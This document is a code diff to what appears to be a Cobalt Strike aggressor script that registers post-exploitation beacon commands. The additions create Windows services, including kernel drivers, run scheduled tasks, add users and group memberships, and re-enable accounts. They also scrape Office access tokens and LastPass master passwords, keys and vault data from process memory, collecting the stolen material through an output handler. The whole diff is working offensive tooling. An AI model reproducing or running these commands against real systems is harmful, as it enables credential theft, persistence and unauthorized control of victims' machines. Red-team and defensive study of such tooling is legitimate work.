@@ -3,26 +3,35 @@
 ########################################
 
 %reghives = %(
-HKCR => 0,
-HKCU => 1,
-HKLM => 2,
-HKU  => 3
+    HKCR => 0,
+    HKCU => 1,
+    HKLM => 2,
+    HKU  => 3
 );
 #sleep can't handle the actual values... so we'll just add them on the c side :(
 
 %regtypes = %(
-REG_SZ => 1,
-REG_EXPAND_SZ => 2,
-REG_BINARY => 3,
-REG_DWORD => 4,
-REG_MULTI_SZ => 7,
-REG_QWORD => 11
+    REG_SZ => 1,
+    REG_EXPAND_SZ => 2,
+    REG_BINARY => 3,
+    REG_DWORD => 4,
+    REG_MULTI_SZ => 7,
+    REG_QWORD => 11
 );
 
 %inttypes = %( 
     REG_DWORD => 1, 
     REG_QWORD => 1
 );
+
+%servicetypes = %(
+    1 => 0x02,
+    2 => 0x01,
+    3 => 0x10,
+    4 => 0x20
+);
+
+$id_lastpass = "LASTPASS>>";
 
 ########################################
 # Helper functions
@@ -226,7 +235,7 @@ Usage:   sc_config <SVCNAME> <BINPATH> <ERRORMODE> <STARTMODE> <OPT:HOSTNAME>
 
 sub bsc_create
 {
-    local('$hostname $servicename $binpath $errormode $startmode $junk $desc $displayname $bid $args');
+    local('$hostname $servicetype $servicename $binpath $errormode $startmode $junk $desc $displayname $bid $args');
     $bid = $1;
     $servicename = $2;
     $displayname = $3;
@@ -234,8 +243,8 @@ sub bsc_create
     $desc = $5;
     $errormode = $6;
     $startmode = $7;
-    $hostname = $8;
-
+    $servicetype = $8;
+    $hostname = $9;
 
     try {
         $junk = parseNumber($errormode, 10);
@@ -257,15 +266,16 @@ sub bsc_create
         berror($bid, "startmode is not a valid value");
         return;
     }
-    $args = bof_pack($bid, "zzzzzss",  $hostname, $servicename, $binpath, $displayname, $desc, $errormode, $startmode);
+
+    $args = bof_pack($bid, "zzzzzsss",  $hostname, $servicename, $binpath, $displayname, $desc, $errormode, $startmode, $servicetype);
     beacon_inline_execute($bid, readbof($bid, "sc_create"), "go", $args);
 }
 
 
-#sc_create <SVCNAME> <DISPLAYNAME> <BINPATH> <DESCRIPTION> <ERRORMODE> <STARTMODE> <OPT:HOSTNAME>
+#sc_create <SVCNAME> <DISPLAYNAME> <BINPATH> <DESCRIPTION> <ERRORMODE> <STARTMODE> <OPT:TYPE> <OPT:HOSTNAME>
 alias sc_create
 {
-    local('$hostname $servicename $binpath $ignore $startmode $junk $desc $displayname');
+    local('$servicetype $hostname $servicename $binpath $ignore $startmode $junk $desc $displayname');
 
     if (size(@_) == 7)
     {
@@ -275,6 +285,7 @@ alias sc_create
         $desc = $5;
         $ignore = $6;
         $startmode = $7;
+        $servicetype = %servicetypes[3];
         $hostname = $null;
     }
     else if(size(@_) == 8)
@@ -285,7 +296,35 @@ alias sc_create
         $desc = $5;
         $ignore = $6;
         $startmode = $7;
-        $hostname = $8;
+        if ($8 in %servicetypes)
+        {
+            $servicetype = %servicetypes[$8];
+        }
+        else
+        {
+            berror($1, "invalid service type index");
+            return;
+        }
+        $hostname = $null;
+    }
+    else if(size(@_) == 9)
+    {
+        $servicename = $2;
+        $displayname = $3;
+        $binpath = $4;
+        $desc = $5;
+        $ignore = $6;
+        $startmode = $7;
+        if ($8 in %servicetypes)
+        {
+            $servicetype = %servicetypes[$8];
+        }
+        else
+        {
+            berror($1, "invalid service type index");
+            return;
+        }
+        $hostname = $9;
     }
     else
     {
@@ -293,7 +332,7 @@ alias sc_create
         return;
     }
 
-    bsc_create($1, $servicename, $displayname, $binpath, $desc, $ignore, $startmode, $hostname);
+    bsc_create($1, $servicename, $displayname, $binpath, $desc, $ignore, $startmode, $servicetype, $hostname);
 }
 
 beacon_command_register(
@@ -302,7 +341,7 @@ beacon_command_register(
     "
 Command: sc_create 
 Summary: This command creates a service on the target host.
-Usage:   sc_create <SVCNAME> <DISPLAYNAME> <BINPATH> <DESCRIPTION> <ERRORMODE> <STARTMODE> <OPT:HOSTNAME>
+Usage:   sc_create <SVCNAME> <DISPLAYNAME> <BINPATH> <DESCRIPTION> <ERRORMODE> <STARTMODE> <OPT:TYPE> <OPT:HOSTNAME>
          SVCNAME      Required. The name of the service to create.
          DISPLAYNAME  Required. The display name of the service.
          BINPATH      Required. The binary path of the service to execute.
@@ -318,6 +357,12 @@ Usage:   sc_create <SVCNAME> <DISPLAYNAME> <BINPATH> <DESCRIPTION> <ERRORMODE> <
                         2 - auto start
                         3 - on demand start
                         4 - disabled
+         TYPE         Optional. The type of service to create. The valid
+                      options are:
+                      1 - SERVICE_FILE_SYSTEM_DRIVER (File system driver service)
+                      2 - SERVICE_KERNEL_DRIVER (Driver service)
+                      3 - SERVICE_WIN32_OWN_PROCESS (Service that runs in its own process) <-- Default
+                      4 - SERVICE_WIN32_SHARE_PROCESS (Service that shares a process with one or more other services)
          HOSTNAME     Optional. The host to connect to and run the commnad on. The
                       local system is targeted if a HOSTNAME is not specified.
 "
@@ -462,6 +507,80 @@ Usage:   sc_start <SVCNAME> <OPT:HOSTNAME>
                   local system is targeted if a HOSTNAME is not specified.
 "
 );
+
+on beacon_output
+{
+    local('$beacon $message $id $output $parsed_return_file @cmd $ret $lp_files $parser $returned_len $returned_len $fp')
+   
+    $beacon = $1;
+    $message = $2;
+    if (strlen($message) > 26) {
+        $message = substr($message, 17);
+        $id = left($message, 10);
+
+        if ($id eq $id_lastpass){
+			@pid = unpack("I",substr($message,0xc,0x10));
+			@type_int = unpack("I",substr($message, 0x10, 0x14));
+			@buf_sz = unpack("I",substr($message, 0x14, 0x18));
+
+			$type = "";
+			if (@type_int[0] == 0){
+				$type = "JSON";
+			}else if (@type_int[0] == 1){
+				$type = "PWD_MEM_OBJECT";
+			}else if (@type_int[0] == 2){
+				$type = "AID";
+			}else if (@type_int[0] == 3){
+				$type = "NAME";
+			}else if (@type_int[0] == 4){
+				$type = "USERNAME";
+			}else if (@type_int[0] == 5){
+				$type = "PASSWORD";
+			}else if (@type_int[0] == 6){
+				$type = "G_LOCAL_KEY";
+			}else if (@type_int[0] == 7){
+				$type = "LOCAL_KEY";
+			}else if (@type_int[0] == 8){
+				$type = "MASTER_PASSWORD";
+			}else if (@type_int[0] == 9){
+				$type = "USER_CONFIG";
+			}else if (@type_int[0] == 10){
+				$type = "PRIV_KEY";
+			}
+
+			if (@type_int[0] == 100)
+			{
+				$parser = script_resource("lastpass/process_lp_files.py");
+				$lp_files = script_resource("lastpass");
+				$parsed_return_file = script_resource("lastpass/out.txt");
+				@cmd = @("python3",$parser, $lp_files);
+				$ret = exec( @cmd );
+				sleep(1 * 1000);
+				blog($beacon, "exec ret: ". readAll($ret). "\n");
+				if(-exists $parsed_return_file) {
+					$returned_len = lof($parsed_return_file);
+					$fp = openf($parsed_return_file);
+					$output = readb($fp, $returned_len);
+					closef($fp);
+					deleteFile($parsed_return_file);
+					blog($beacon, "LastPass return value: \n" . $output);
+				}else{
+					println("Exec failed");
+					blog($beacon, "Exec failed");
+				}	
+			} else {
+				$lp_filename = script_resource("lastpass/lp_".@pid[0]."_".$type.".txt");
+				$handle = openf(">>".$lp_filename);
+				print($handle, "<MSG>");
+				print($handle, substr($message,0x18));
+				println($handle, "</MSG>");
+				closef($handle);
+			}	
+
+        }
+    }
+}
+
 
 ########################################
 # Registry commands
@@ -1042,6 +1161,49 @@ Note:    The full path including the task name must be given, e.g.:
 "
 );
 
+#schtasksrun <OPT:HOSTNAME> <TASKNAME>
+alias schtasksrun
+{
+    local('$bid $args $server $taskname')
+    $bid = $1;
+    $server = "";
+    if ( size(@_) < 2)
+    {
+        berror($bid, "Invalid Usage");
+        berror($bid, beacon_command_detail("schtasksrun"));
+        return;
+    } else if(size(@_) == 2)
+    {
+        $taskname = $2;
+    } else if(size(@_) == 3)
+    {
+        $server = $2;
+        $taskname = $3;
+    } else
+    {
+        berror($bid, "Invalid Usage");
+        berror($bid, beacon_command_detail("schtasksrun"));
+        return;
+    }
+    $args = bof_pack($bid, "ZZ", $server, $taskname);
+    beacon_inline_execute($bid, readbof($bid, "schtasksrun"), "go", $args);
+}
+
+beacon_command_register(
+    "schtasksrun",
+    "Run the specified scheduled task",
+    "
+Command: schtasksrun
+Summary: This command runs a scheduled task.
+Usage:   schtasksstop <OPT:HOSTNAME> <TASKNAME>
+         HOSTNAME  Optional. The target system (local system if not specified)
+         TASKNAME  Required. The scheduled task name.
+Note:    The full path including the task name must be given, e.g.:
+             schtasksstop \\Microsoft\\Windows\\MUI\\LpRemove
+             schtasksstop \\Microsoft\\windows\\MUI\\totallyreal
+"
+);
+
 
 
 ########################################
@@ -1209,7 +1371,106 @@ Usage:   setuserpass <USERNAME> <PASSWORD> <DOMAIN>
 );
     
 
+#addusertogroup
+alias addusertogroup
+{
+    if(size(@_) != 5)
+    {
+        berror($1, beacon_command_detail("addusertogroup"));
+        berror($1, "Invalid number of parameters");
+        return;
+    }
+    beacon_inline_execute($1, readbof($1, "addusertogroup"), "go", bof_pack($1, "ZZZZ", $5, $4, $2, $3));
+}
 
+beacon_command_register(
+    "addusertogroup",
+    "Add the specified user to the specified group",
+    "
+Command: addusertogroup
+Summary: Add the specified user to the group. Domain groups only!
+
+Usage:   addusertogroup <USERNAME> <GROUPNAME> <SERVER> <DOMAIN>
+         USERNAME   Required. The user name to activate/enable. 
+         GROUPNAME  Required. The group to add the user to.
+         SERVER     Required. The target computer to perform the addition on. use \"\" for the local machine
+         DOMAIN     Required. The domain/computer for the account. You must give 
+                    the domain name for the user if it is a domain account, or
+                    use \"\" to target an account on the local machine.
+                    
+"
+);
+
+#adduser
+alias adduser
+{
+    local('$bid $username $pass $server');
+
+    if(size(@_) < 3 || size(@_) > 4)
+    {
+        berror($1, beacon_command_detail("adduser"));
+        berror($1, "Invalid number of parameters");
+        return;
+    }
+    else if(size(@_) == 3)
+    {
+        $bid = $1;
+        $username = $2;
+        $pass = $3;
+        $server = "";
+    }
+    else if(size(@_) == 4)
+    {
+        $bid = $1;
+        $username = $2;
+        $pass = $3;
+        $server = $4;
+    }
+
+    beacon_inline_execute($bid, readbof($bid, "adduser"), "go", bof_pack($bid, "ZZZ", $username, $pass, $server));
+}
+
+beacon_command_register(
+    "adduser",
+    "Add a new user to a machine.",
+    "
+Command: adduser
+Summary: Add a new user to a machine.
+
+Usage:   adduser <USERNAME> <PASSWORD> <SERVER>
+         USERNAME   Required. The name of the new user. 
+         PASSWORD   Required. The password of the new user. 
+         SERVER     Optional. If entered, the user will be created on that machine. If not, the
+                    local machine will be used.
+"
+);
+
+#enableuser <USERNAME> <DOMAIN>
+alias unexpireuser
+{
+    if(size(@_) != 3)
+    {
+        berror($1, beacon_command_detail("unexpireuser"));
+        berror($1, "Invalid number of parameters");
+        return;
+    }
+    beacon_inline_execute($1, readbof($1, "unexpireuser"), "go", bof_pack($1, "ZZ", $3, $2));
+}
+
+beacon_command_register(
+    "unexpireuser",
+    "Enables and unlocks the specified user account",
+    "
+Command: unexpireuser
+Summary: Activates (and if necessary enables) the specified user account on the
+         target computer. 
+Usage:   unexpireuser <USERNAME> <DOMAIN>
+         USERNAME  Required. The user name to activate/enable. 
+         DOMAIN    Required. The domain/computer for the account. You must give 
+                   the domain name for the user if it is a domain account, or
+                   use \"\" to target an account on the local machine.
+"
+);
 
 
 #chromeKey
@@ -1293,7 +1554,6 @@ alias shspawnas {
 }
 
 
-
 beacon_command_register(
     'shspawnas',
     'spawn / inject as specified user',
@@ -1360,4 +1620,105 @@ Usage:   adcs_request /CA:ca [/TEMPLATE:template] [/SUBJECT:subject] [/ALTNAME:a
          INSTALL   Optional. Install the certificate in current context?
          MACHINE   Optional. Request a certificate for a machine instead of a user?
 "
+);
+
+alias office_tokens 
+{
+	local('$pid $args');
+	if(size(@_) != 2)
+	{
+		berror($1, "usage: office_tokens <pid>");
+		return;
+	}
+	$pid = parseNumber($2, 10);
+    berror($1, $pid);
+
+	$args = bof_pack($1, "i", $pid);
+	beacon_inline_execute($1, readbof($1, "office_tokens"), "go", $args);
+}
+
+beacon_command_register(
+	"office_tokens",
+	"Searches memory for Office JWT Access Tokens",
+	"Command: office_tokens
+
+Usage: office_tokens <pid> "
+);
+
+alias lastpass
+{
+	local('$pid $args $value $i $buffer $arg_sz');
+	$arg_sz = size(@_);
+	if(size(@_) < 2)
+	{
+		berror($1, "usage: lastpass <pid1> <pid2> <pid3> .. <pidn>");
+		return;
+	}
+
+    $buffer = allocate(0);
+
+	for( $i = 1; $i < $arg_sz; $i++)
+	{
+        bwrite($buffer, "i", @_[$i]);
+	}
+    bwrite($buffer, "i", 0); # null terminator at the end
+    closef($buffer);
+    $value = readb($buffer, -1);
+
+	$arg_sz = $arg_sz - 1;
+
+	berror($1, $arg_sz);
+	$args = bof_pack($1, "ib", $arg_sz, $value);
+	beacon_inline_execute($1, readbof($1, "lastpass"), "go", $args);
+	berror($1, "FINISHED");
+}
+
+beacon_command_register(
+	"lastpass",
+	"Searches memory for LastPass passwords and hashes",
+	"Command: lastpass 
+
+Usage: lastpass <number of pids> <pid>,<pid>,<pid> ... "
+);
+
+alias suspend {
+    local('$args');
+    if(size(@_) < 2)
+	{
+		berror($1, beacon_command_detail("suspend"));
+		return;
+	}
+    $args = bof_pack($1, "si", 1, $2);
+    beacon_inline_execute($1, readbof($1, "suspendresume"), "go", $args);
+}
+
+beacon_command_register(
+    "suspend",
+    "suspend a process by pid",
+    "Command: suspend
+    
+Usage: suspend <pid>
+
+attempts to suspend the process listed"
+);
+
+alias resume {
+    local('$args');
+    if(size(@_) < 2)
+	{
+		berror($1, beacon_command_detail("resume"));
+		return;
+	}
+    $args = bof_pack($1, "si", 0, $2);
+    beacon_inline_execute($1, readbof($1, "suspendresume"), "go", $args);
+}
+
+beacon_command_register(
+    "resume",
+    "resume a process by pid",
+    "Command: resume
+    
+Usage: resume <pid>
+
+attempts to resume the process listed"
 );
